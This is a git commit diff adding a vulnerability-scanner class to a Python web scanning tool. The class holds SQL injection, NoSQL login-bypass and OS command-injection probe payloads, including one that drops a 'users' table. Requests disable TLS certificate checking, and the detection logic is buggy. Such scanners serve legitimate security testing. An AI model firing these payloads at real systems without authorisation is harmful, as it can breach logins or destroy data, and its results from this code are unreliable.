d1112f1a0f2d55f96a7e5710f100ed9321c79e2d
tahaafarooq <tahacodez@gmail.com>
2023-05-28 03:11:13 +0300

    Added Vulnerability Scan Object

--- artemis/scanner.py
+++ artemis/scanner.py
@@ -1,5 +1,5 @@
 from dotenv import load_dotenv
-import wappalyzer
+from Wappalyzer import Wappalyzer, WebPage
 import requests
 import json
 import os
@@ -74,7 +74,7 @@ class WebScanner(object):
 
         for directory in directories:
             full_url = f"{url}/{directory}"
-            res = requests.get(full_url)
+            res = requests.get(full_url, verify=False)
             if res.status_code == 200:
                 self.found_directories.append(directory)
                 print(f"[+] Directory Found: {full_url} [-]")
@@ -83,18 +83,125 @@ class WebScanner(object):
 
         return self.found_directories
 
-    def get_tech_stacks(self, url: str):
-        apps, errors = wappalyzer.detect(url)
-        if not errors:
-            for app in apps:
-                data = {
-                    "Techonology": app['name'],
-                    "Categories": f"{', '.join(app['categories'])}",
-                    "Versions": f"{', '.join(app['versions'])}"
-                }
-                self.stacks.append(data)
-            return self.statcks
-        else:
-            return "Not Found"
+    # def get_tech_stacks(self, url: str):
+    #     apps, errors = wappalyzer.detect(url)
+    #     if not errors:
+    #         for app in apps:
+    #             data = {
+    #                 "Techonology": app['name'],
+    #                 "Categories": f"{', '.join(app['categories'])}",
+    #                 "Versions": f"{', '.join(app['versions'])}"
+    #             }
+    #             self.stacks.append(data)
+    #         return self.statcks
+    #     else:
+    #         return "Not Found"
 
-    def
+    def get_technology_stacks(self, url: str):
+        webpage = WebPage.new_from_url(url)
+        wappalyzer = Wappalyzer.latest()
+        result = wappalyzer.analyze_with_versions_and_categories(webpage)
+
+        return result
+
+
+class VulnScanner(object):
+    def __init__(self):
+        self.__author__ = "tahaafarooq"
+        self.sqli_auth_wordlist = "sqli_auth_bypass.txt"
+
+    """
+    OWASP 10 : INJECTION
+    The functions below here are only based on injection based vulnerabilities!
+    """
+
+    # The URL that is passed in the sqli_url_based should contain a query that takes input, which is to be tested
+    # for example, https://tahaafarooq.pew/index.php?id=
+    def sqli_url_based(self, url: str):
+        payloads = [
+            "1' OR '1'='1",
+            "1' OR '1'='1' --",
+            "1' OR '1'='1' /*",
+            "1' OR '1'='1' #",
+            "1' OR '1'='1' ; DROP TABLE users --"
+        ]
+        success_payload = []
+        failed_payload = []
+        for payload in payloads:
+            try:
+                url_to_test = f"{url}{payload}"
+                response = requests.get(url_to_test, verify=False)
+
+                if "error" in response.text:
+                    success_payload.append(payload)
+                else:
+                    failed_payload.append(payload)
+            except requests.exceptions.RequestException as RE:
+                print(f"Error Occurred! : {RE}")
+
+        if len(success_payload) > 0 and len(failed_payload) < 5:
+            return json.dumps({"SQL Injection": True, "Payloads": success_payload})
+        else:
+            return json.dumps({"SQL Injection": False})
+
+    # inp_a and inp_b respectively should carry the field names of the username and password
+    def sqli_form_based(self, url: str, inp_a: str, inp_b: str):
+        with open(self.sqli_auth_wordlist, "r") as wordlist:
+            payloads = wordlist.read().splitlines()
+
+        for payload in payloads:
+            data = {
+                inp_a: payload,
+                inp_b: "testing"
+            }
+            try:
+                response = requests.post(url, data=data, allow_redirects=True, verify=False)
+
+                if response.is_redirect:
+                    return json.dumps({"SQL Injection": True})
+                else:
+                    return json.dumps({"SQL Injection": False})
+            except requests.exceptions.RequestException as e:
+                print(e)
+
+    # inp_a and inp_b respectively should carry the field names of the username and password
+    def nosqli_form_based(self, url: str, inp_a: str, inp_b: str):
+        payload = {
+            inp_a: 'admin',
+            inp_b: {'$ne': 'testing'}
+        }
+        response = requests.post(url, json=payload, verify=False)
+
+        if response.status_code == 200 and 'Authentication successful' in response.text:
+            return json.dumps({"NOSQL Injection": True})
+        else:
+            return json.dumps({"NOSQL Injection": False})
+
+    # The URL should contain a parameter for the input to be passed.
+    # For example, https://tahaafarooq.dev/output.php?ping=
+    def osi_url_based(self, url: str):
+        payloads = [
+            "; echo 'aGVsbG8K'|base64 -d;",
+            "\necho 'aGVsbG8K'|base64 -d;",
+            "@(1000+337)",
+            "system('echo aGVsbG8K|base64 -d')",
+            "echo 'pewpewpew'"
+        ]
+
+        outputs = [
+            'hello',
+            '1337',
+            'pewpewpew',
+        ]
+
+        success_payloads = []
+
+        for payload in payloads:
+            response = requests.post(f"{url}{payload}")
+            for output in outputs:
+                if output in response.text:
+                    success_payloads.append(payload)
+                else:
+                    return json.dumps({"OS Command Injection": False})
+
+        return json.dumps({"OS Command Injection": True, "Payload": success_payloads})
